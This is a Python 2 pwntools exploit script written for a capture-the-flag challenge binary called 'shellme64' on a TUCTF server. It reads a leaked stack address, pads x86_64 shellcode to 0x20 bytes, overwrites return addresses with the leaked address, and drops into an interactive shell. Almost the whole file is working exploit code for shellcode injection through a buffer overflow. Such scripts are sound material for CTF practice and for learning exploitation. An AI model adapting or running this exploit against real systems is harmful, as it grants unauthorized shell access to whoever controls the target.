#!/usr/bin/env python2
from pwn import *
from mypwntools import * # ~/workspace/tools/mypwntools/
import logging
import coloredlogs
# shellcodes['binsh32']
# shellcodes['binshx86_64']
# gethex(string)

coloredlogs.install()
log = logging.getLogger("Exploit")

#context.log_level = 'debug'
context.terminal = ['alacritty', '-e', 'sh', '-c']

BINARY = "./shellme64"
HOST, PORT = 'chal.tuctf.com', 30507
LIBC_PATH = '/usr/lib/libc.so.6'

GDB_SETUP = """
set follow-fork-mode child
c
"""

if '--live' not in sys.argv:
    p = process(BINARY)
    if '--debug' in sys.argv:
        gdb.attach(p, GDB_SETUP)
else:
    p = remote(HOST, PORT)

if LIBC_PATH:
    libc = ELF(LIBC_PATH)

a = p.recv()
location = gethex(a)
payload = shellcodes['x86_64']
while len(payload) < 0x20:
    payload += 'A'

payload += p64(location) * 4

p.sendline(payload)

p.interactive()

